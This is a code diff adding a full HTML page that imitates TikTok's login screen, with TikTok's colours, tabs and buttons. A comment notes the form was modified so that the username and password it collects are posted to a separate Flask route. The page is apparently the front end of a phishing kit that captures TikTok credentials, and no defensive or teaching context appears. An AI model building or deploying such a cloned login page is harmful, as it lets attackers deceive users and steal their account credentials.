@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to TikTok</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: TikTokFont, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #121212;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 16px 24px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 44px;
+            margin-bottom: 20px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+        }
+
+        .help-icon {
+            color: #121212;
+            cursor: pointer;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            text-align: center;
+            color: #121212;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .tabs {
+            display: flex;
+            width: 100%;
+            border-bottom: 1px solid #e3e3e4;
+            margin-bottom: 8px;
+        }
+
+        .tab {
+            flex: 1;
+            padding-bottom: 10px;
+            text-align: center;
+            font-size: 15px;
+            font-weight: 600;
+            color: #73747b;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .tab.active {
+            color: #121212;
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: #121212;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 44px;
+            padding: 0 12px;
+            background-color: #f1f1f2;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            font-size: 15px;
+            outline: none;
+            color: #121212;
+        }
+
+        .input-field:focus {
+            border-color: #c8c8ca;
+            background-color: #ffffff;
+        }
+
+        .input-field::placeholder {
+            color: #73747b;
+        }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #73747b;
+            display: flex;
+            align-items: center;
+        }
+
+        .forgot-link {
+            font-size: 13px;
+            font-weight: 600;
+            color: #73747b;
+            text-decoration: none;
+            align-self: flex-start;
+            margin-top: -4px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 44px;
+            background-color: #fe2c55;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #e02447;
+        }
+
+        /* Footer / Bottom Prompt */
+        .footer {
+            margin-top: auto;
+            border-top: 1px solid #e3e3e4;
+            padding-top: 16px;
+            padding-bottom: 12px;
+            width: 100%;
+            text-align: center;
+            font-size: 15px;
+            color: #121212;
+        }
+
+        .footer a {
+            color: #fe2c55;
+            font-weight: 700;
+            text-decoration: none;
+            margin-left: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <button class="back-btn" aria-label="Back">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#121212" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+            </svg>
+        </button>
+
+        <div class="help-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <h1 class="title">Log in</h1>
+
+        <div class="tabs">
+            <div class="tab">Phone</div>
+            <div class="tab active">Email / Username</div>
+        </div>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <div class="input-group">
+                <input type="text" class="input-field" name="username" placeholder="Email or username" required />
+            </div>
+
+            <div class="input-group">
+                <div class="password-wrapper">
+                    <input type="password" class="input-field" name="password" placeholder="Password" required />
+                    <button type="button" class="eye-icon" aria-label="Toggle password visibility">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <button type="submit" class="btn-submit">Log in</button>
+        </form>
+    </main>
+
+    <footer class="footer">
+        Don't have an account? <a href="#">Sign up</a>
+    </footer>
+
+</body>
+</html>
